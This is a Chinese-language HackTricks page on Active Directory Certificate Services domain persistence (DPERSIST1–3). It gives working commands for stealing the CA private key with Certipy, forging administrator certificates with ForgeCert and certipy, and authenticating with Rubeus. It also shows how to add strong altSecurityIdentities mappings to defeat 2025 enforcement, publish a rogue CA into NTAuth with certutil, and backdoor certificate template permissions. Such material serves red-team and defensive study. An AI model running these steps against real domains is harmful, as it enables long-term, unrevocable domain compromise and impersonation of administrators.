# AD CS 域持久性

{{#include ../../../banners/hacktricks-training.md}}

**这是对 [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) 中分享的域持久化技术的总结**。请查阅以获取更多细节。

## 使用被盗 CA 证书伪造证书 - DPERSIST1

如何判断某个证书是 CA 证书？

如果满足以下几个条件，则可以判断该证书为 CA 证书：

- 证书存储在 CA 服务器上，其私钥由机器的 DPAPI 保护，或者在操作系统支持的情况下由硬件（例如 TPM/HSM）保护。
- 证书的 Issuer 和 Subject 字段都与 CA 的区分名称相匹配。
- "CA Version" 扩展仅存在于 CA 证书中。
- 证书缺少 Extended Key Usage (EKU) 字段。

要提取该证书的私钥，通过内置 GUI 的受支持方法是在 CA 服务器上使用 `certsrv.msc` 工具。尽管如此，该证书与系统中存储的其他证书并无不同；因此也可以使用诸如 [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) 等方法来提取。

也可以使用 Certipy 获取该证书和私钥，命令如下：
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
在获取 CA 证书及其私钥（`.pfx` 格式）后，可以使用像 [ForgeCert](https://github.com/GhostPack/ForgeCert) 这样的工具来生成有效的证书：
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> 被针对进行证书伪造的用户必须处于活动状态且能够在 Active Directory 中进行身份验证，过程才会成功。对像 krbtgt 这样的特殊账户伪造证书是无效的。

这个伪造证书将在指定的结束日期之前以及**只要根 CA 证书有效**期间**有效**（通常为 5 到 **10+ 年**）。它也对**计算机**有效，因此结合 **S4U2Self**，攻击者可以**在任何域机器上维持持久性**，只要 CA 证书有效。\
此外，使用此方法生成的**证书**无法被吊销，因为 CA 并不知道它们的存在。

### Operating under Strong Certificate Mapping Enforcement (2025+)

自 2025 年 2 月 11 日起（在 KB5014754 推出后），域控制器默认对证书映射启用 **Full Enforcement**。实际上这意味着你的伪造证书必须要么：

- 包含与目标账户的强绑定（例如，SID security extension），或
- 与目标对象的 `altSecurityIdentities` 属性上的强显式映射配对。

一种可靠的持久化方法是铸造一个链到被盗 Enterprise CA 的伪造证书，然后在受害主体上添加强的显式映射：
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
注意
- 如果你能制作包含 SID security extension 的伪造证书，这些证书即使在 Full Enforcement 下也会被隐式映射。否则，优先使用显式的强映射。有关显式映射的更多信息，请参见 [account-persistence](account-persistence.md)。
- 吊销对防御方在此场景无效：伪造证书对 CA 数据库来说是未知的，因此无法被吊销。

## Trusting Rogue CA Certificates - DPERSIST2

`NTAuthCertificates` 对象被定义为在其 `cacertificate` 属性中包含一个或多个 **CA certificates**，供 Active Directory (AD) 使用。**domain controller** 的验证过程会检查 `NTAuthCertificates` 对象，寻找与正在进行身份验证的 **certificate** 的 Issuer 字段中指定的 **CA** 相匹配的条目。如果找到匹配项，则继续进行身份验证。

攻击者可以在控制该 AD 对象的情况下将自签名 CA 证书添加到 `NTAuthCertificates` 对象。通常，只有 **Enterprise Admin** 组的成员，以及 **Domain Admins** 或 **Administrators**（位于 **forest root’s domain**）才被授予修改此对象的权限。可以使用 `certutil.exe` 编辑 `NTAuthCertificates` 对象，命令为 `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`，或者使用 [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool)。

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
当与先前介绍的使用 ForgeCert 动态生成证书的方法结合使用时，此能力尤其相关。

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## 恶意错误配置 - DPERSIST3

通过对 AD CS 组件的 **security descriptor modifications** 来实现 **persistence** 的机会非常多。攻击者在获得提升权限后可以恶意实施在 "[Domain Escalation](domain-escalation.md)" 一节中描述的修改。这包括向以下敏感组件添加“控制权限”（例如 WriteOwner/WriteDACL/etc.）：

- CA 服务器的 AD 计算机对象
- CA 服务器的 RPC/DCOM 服务
- 任何位于 **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** 下的后代 AD 对象或容器（例如 Certificate Templates container、Certification Authorities container、NTAuthCertificates object 等）
- 默认或由组织委派了控制 AD CS 权限的 AD 组（例如内置的 Cert Publishers 组及其任何成员）

一个恶意实现的示例是：攻击者在域中拥有 **elevated permissions** 后，将 **`WriteOwner`** 权限添加到默认的 **`User`** certificate template，并将攻击者设为该权限的主体。为了利用这一点，攻击者首先会将 **`User`** 模板的所有权更改为自己。随后，会在该模板上将 **`mspki-certificate-name-flag`** 设置为 **1** 以启用 **`ENROLLEE_SUPPLIES_SUBJECT`**，允许用户在请求中提供 Subject Alternative Name。随后，攻击者可以使用该 **template** 进行 **enroll**，在替代名称中选择一个 **域管理员 (domain administrator)** 名称，并将获得的证书用于以域管理员身份进行身份验证。

攻击者可能为长期域持久性设置的实用参数（完整细节和检测见 {{#ref}}domain-escalation.md{{#endref}}）：

- 允许请求者提供 SAN 的 CA 策略标志（例如启用 `EDITF_ATTRIBUTESUBJECTALTNAME2`）。这使得类似 ESC1 的路径仍可被利用。
- 允许具备认证能力的签发的模板 DACL 或设置（例如添加 Client Authentication EKU，启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`）。
- 控制 `NTAuthCertificates` 对象或 CA 容器，以在防御方尝试清理时持续重新引入恶意颁发者。

> [!TIP]
> 在应用 KB5014754 的加固环境中，将这些错误配置与显式强映射（`altSecurityIdentities`）配合，可确保即便 DC 强制强映射，所颁发或伪造的证书仍然可用。



## 参考资料

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
{{#include ../../../banners/hacktricks-training.md}}
